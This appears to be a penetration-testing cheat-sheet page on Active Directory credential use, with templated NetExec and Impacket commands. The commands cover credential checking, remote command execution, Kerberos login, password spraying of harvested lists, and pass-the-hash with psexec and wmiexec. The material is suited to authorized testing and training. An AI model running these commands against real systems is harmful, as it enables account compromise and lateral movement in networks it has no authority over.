---
title: AD credentials and access
order: 3
tags: [ad, credentials, netexec, smb, kerberos]
---

## Domain or local login

Use the account's actual authority. A successful login does not establish administrator access.

```bash
# Domain account
nxc smb {{MS01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
nxc smb {{MS02}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
# Local account
nxc smb {{MS01}} -u '{{USER}}' -p '{{PASS}}' --local-auth
nxc smb {{MS02}} -u '{{USER}}' -p '{{PASS}}' --local-auth
```

[Domain authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain), [local authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-local).

## Reuse one known credential

- [ ] Check [password policy](active-directory/ad-enumeration#password-policy) before repeated attempts.
- [ ] Test one intended host and service; record authority, result and actual access.
- [ ] Read [SMB shares](services/common-services#smb) and [remote access](services/remote-access#winrm) with the permissions obtained.

[Lockout considerations](https://www.netexec.wiki/smb-protocol/password-spraying).

## Remote Windows command

Requires administrative access and a working remote execution method. Verify the resulting identity.

```bash
nxc smb {{MS01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -x whoami
nxc smb {{MS02}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -x whoami
```

NetExec's admin indicator is a lead; check the command result itself. [Source](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command).

## Kerberos authentication

Set RHOST to the target's FQDN and DC01 to the KDC address.

```bash
nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -k --kdcHost {{DC01}}
```

Check [DNS and time](active-directory/kerberos#kerberos-dns-or-clock-failure) first. [Source](https://www.netexec.wiki/getting-started/using-kerberos).

## Password spraying

Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali.

```bash
nxc smb {{MS01}} {{MS02}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
nxc winrm {{MS01}} {{MS02}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
```

`(Pwn3d!)` or `STATUS_SUCCESS` marks a working pair. Empty the cracked pair from the list before the next round to avoid lockouts. [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain).

## Pass-the-Hash

Replay an NT hash where a password would otherwise go. Set NTHASH to the hash after the colon in `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.

```bash
impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{MS02}}
impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{MS02}}
```

Requires administrator on the target; a domain-admin hash reaches {{DC01}} the same way. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).
